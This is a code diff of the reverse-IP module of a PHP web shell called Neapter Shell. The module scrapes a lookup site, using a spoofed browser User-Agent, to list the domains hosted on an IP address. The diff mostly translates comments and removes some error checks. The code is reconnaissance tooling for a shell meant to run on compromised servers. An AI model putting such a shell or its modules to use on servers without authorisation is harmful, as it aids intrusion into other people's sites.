@@ -3,27 +3,31 @@
 /**
  * Neapter Shell
  *
+ * @category  WebShell
+ * @package   NeapterShell
  * @author    Krzysztof Otręba <krzotr@gmail.com>
- * @copyright Copyright (c) 2012, Krzysztof Otręba
+ * @copyright 2011-2016 Krzysztof Otręba
  *
- * @license   http://www.gnu.org/licenses/gpl-3.0.txt
+ * @license http://www.gnu.org/licenses/gpl-3.0.txt GPL3
+ * @link    http://github.com/krzotr/neapter-shell
  */
 
 /**
- * Reverse IP
+ * Reverse IP. Get domains from IP address
  *
+ * @category  WebShell
+ * @package   NeapterShell
  * @author    Krzysztof Otręba <krzotr@gmail.com>
- * @copyright Copyright (c) 2012, Krzysztof Otręba
+ * @copyright 2011-2016 Krzysztof Otręba
  *
- * @package    NeapterShell
- * @subpackage Modules
+ * @license http://www.gnu.org/licenses/gpl-3.0.txt GPL3
+ * @link    http://github.com/krzotr/neapter-shell
  */
 class ModuleRevip extends ModuleAbstract
 {
     /**
-     * Dostepna lista komend
+     * Get list of available commands
      *
-     * @access public
      * @return array
      */
     public static function getCommands()
@@ -32,23 +36,18 @@ class ModuleRevip extends ModuleAbstract
     }
 
     /**
-     * Zwracanie wersji modulu
+     * Get module version
      *
-     * @access public
      * @return string
      */
     public static function getVersion()
     {
-        /**
-         * Wersja Data Autor
-         */
-        return '1.00 2011-09-12 - <krzotr@gmail.com>';
+        return '1.0.1 2016-06-26 - <krzotr@gmail.com>';
     }
 
     /**
-     * Zwracanie pomocy modulu
+     * Get details module information
      *
-     * @access public
      * @return string
      */
     public static function getHelp()
@@ -65,72 +64,52 @@ DATA;
     }
 
     /**
-     * Wywolanie modulu
+     * Execute module
      *
-     * @access public
      * @return string
      */
     public function get()
     {
-        /**
-         * Help
-         */
         if ($this->oArgs->getNumberOfParams() !== 1) {
             return self::getHelp();
         }
 
-        /**
-         * Naglowki
-         */
-        $aStream = array
-        (
-            'http' => array
-            (
+        $aStream = array(
+            'http' => array(
                 'method' => 'GET',
-                'header' => "User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11\r\n" .
-                    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
+                'header' => "User-Agent: Mozilla/5.0 (Windows NT 5.1) " .
+                            "AppleWebKit/537.11 (KHTML, like Gecko) " .
+                            "Chrome/23.0.1271.64 Safari/537.11\r\n" .
+                            "Accept: text/html,application/xhtml+xml," .
+                            "application/xml;q=0.9,*/*;q=0.8\r\n"
             )
         );
 
-        /**
-         * Pobieranie danych
-         */
-        if (($sData = file_get_contents('http://www.ip-adress.com/reverse_ip/' . $this->oArgs->getParam(0), FALSE, stream_context_create($aStream))) === FALSE) {
+        $sData = @ file_get_contents(
+            'http://www.ip-adress.com/reverse_ip/' . $this->oArgs->getParam(0),
+            false,
+            stream_context_create($aStream)
+        );
+
+        if (!$sData) {
             return 'Nie można połączyć się z serwerem';
         }
 
-        /**
-         * Zly host
-         */
-        if (strpos($sData, 'could not be resolved. Make sure that you enter an valid IP address, host or domainname')) {
+        if (strpos($sData, 'could not be resolved. Make sure that you enter')) {
             return 'Nie można przetłumacz hosta';
         }
 
-        /**
-         * Zly host
-         */
         if (strpos($sData, '<div id="hostcount">0 Hosts on this IP</div>')) {
-            return 'Brak adresów IP';
+            return 'Brak hostów na podanym adresie IP';
         }
 
-        /**
-         * Wyciaganie danych
-         */
-        if (!preg_match('~<table class="list">(.+?)</table>~s', $sData, $aData)) {
-            return 'Wystąpił błąd podczas wyciągania danych';
-        }
+        preg_match('~<table class="list">(.+?)</table>~s', $sData, $aData);
+        preg_match_all('~<td>\r\n(.+?)</td>~', $aData[1], $aData);
 
-        /**
-         * Wyciaganie danych
-         */
-        if (!preg_match_all('~<td>\r\n(.+?)</td>~', $aData[1], $aData)) {
-            return 'Wystąpił błąd podczas wyciągania hostów';
-        }
-
-        /**
-         * Wyswietlanie adresow
-         */
-        return sprintf("Zwrócono %d witryn:\r\n\r\n\t%s", count($aData[1]), implode("\r\n\t", $aData[1]));
+        return sprintf(
+            "Zwrócono %d witryn:\r\n\r\n  %s",
+            count($aData[1]),
+            implode("\r\n  ", $aData[1])
+        );
     }
-
 }
